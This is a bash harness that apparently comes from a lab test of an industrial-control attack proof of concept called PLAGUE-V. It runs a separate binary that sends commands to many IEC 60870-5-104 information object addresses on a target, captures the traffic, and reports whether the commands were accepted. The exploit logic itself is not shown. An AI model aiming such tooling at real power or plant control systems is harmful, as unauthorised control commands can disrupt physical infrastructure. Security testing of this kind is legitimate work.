#!/usr/bin/env bash
# ────────────────────────────────────────────────
# PLAGUE-V — Multi-IOA Attack Test Script
# ────────────────────────────────────────────────
set -euo pipefail

TARGET_IP="${1:-10.10.10.10}"
TARGET_PORT="${2:-2404}"
CONFIG="${3:-config/target_ioa_map.txt}"
PCAP_FILE="plague_v_multi_$(date +%Y%m%d_%H%M%S).pcap"
TCPDUMP_PID=""

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

info()  { echo -e "${GREEN}[+]${NC} $*"; }
warn()  { echo -e "${YELLOW}[*]${NC} $*"; }
fail()  { echo -e "${RED}[!]${NC} $*"; }

cleanup() {
    if [ -n "$TCPDUMP_PID" ] && kill -0 "$TCPDUMP_PID" 2>/dev/null; then
        warn "Stopping tcpdump (PID $TCPDUMP_PID)"
        sudo kill "$TCPDUMP_PID" 2>/dev/null || true
        wait "$TCPDUMP_PID" 2>/dev/null || true
    fi
}
trap cleanup EXIT

echo "══════════════════════════════════════════"
echo "  PLAGUE-V Multi-IOA Test"
echo "  Target: ${TARGET_IP}:${TARGET_PORT}"
echo "  Config: ${CONFIG}"
echo "══════════════════════════════════════════"
echo

# Step 1: Check binary 
if [ ! -f ./plague_v_multi ]; then
    fail "plague_v_multi binary not found. Run 'make' first."
    exit 1
fi
info "Binary found: ./plague_v_multi"

# Step 2: Check config 
if [ ! -f "$CONFIG" ]; then
    fail "Config file missing: $CONFIG"
    exit 1
fi
IOA_COUNT=$(grep -v '^\s*#' "$CONFIG" | grep -v '^\s*$' | wc -l)
info "Config loaded: ${IOA_COUNT} IOA targets"

# Step 3: Check target reachability 
warn "Checking if ${TARGET_IP}:${TARGET_PORT} is reachable ..."
if nc -zv -w 3 "$TARGET_IP" "$TARGET_PORT" 2>&1; then
    info "Target is reachable"
else
    fail "Target ${TARGET_IP}:${TARGET_PORT} is NOT reachable"
    echo "    Start the server first:"
    echo "    cd /opt/lib60870/lib60870-C/examples/cs104_server && ./simple_server"
    exit 1
fi
echo

# Step 4: Start tcpdump (optional) 
if command -v tcpdump &>/dev/null; then
    warn "Starting tcpdump → ${PCAP_FILE}"
    sudo tcpdump -i any -w "$PCAP_FILE" port "$TARGET_PORT" &>/dev/null &
    TCPDUMP_PID=$!
    sleep 1
    if kill -0 "$TCPDUMP_PID" 2>/dev/null; then
        info "tcpdump running (PID $TCPDUMP_PID)"
    else
        warn "tcpdump failed to start — continuing without capture"
        TCPDUMP_PID=""
    fi
else
    warn "tcpdump not found — skipping packet capture"
fi
echo

# Step 5: Run attack 
warn "Running multi-IOA attack ..."
echo "────────────────────────────────────────"
set +e
./plague_v_multi "$TARGET_IP" "$TARGET_PORT" "$CONFIG"
POC_EXIT=$?
set -e
echo "────────────────────────────────────────"
echo

# Step 6: Report
case $POC_EXIT in
    0)  info "EXIT CODE: ${POC_EXIT} — ALL COMMANDS ACCEPTED" ;;
    1)  fail "EXIT CODE: ${POC_EXIT} — FAILURE" ;;
    2)  warn "EXIT CODE: ${POC_EXIT} — PARTIAL SUCCESS" ;;
    *)  fail "EXIT CODE: ${POC_EXIT} — UNEXPECTED" ;;
esac

# Step 7: PCAP summary 
if [ -n "$TCPDUMP_PID" ]; then
    echo
    sleep 1
    sudo kill "$TCPDUMP_PID" 2>/dev/null || true
    wait "$TCPDUMP_PID" 2>/dev/null || true
    TCPDUMP_PID=""

    if [ -f "$PCAP_FILE" ]; then
        PCAP_SIZE=$(stat -c%s "$PCAP_FILE" 2>/dev/null || echo "?")
        info "PCAP saved: ${PCAP_FILE} (${PCAP_SIZE} bytes)"
        echo "    Analyze: wireshark ${PCAP_FILE}"
        echo "    Filter:  iec60870_asdu.typeid == 45"
    fi
fi

echo
echo "══════════════════════════════════════════"
echo "  Test complete"
echo "══════════════════════════════════════════"

exit $POC_EXIT
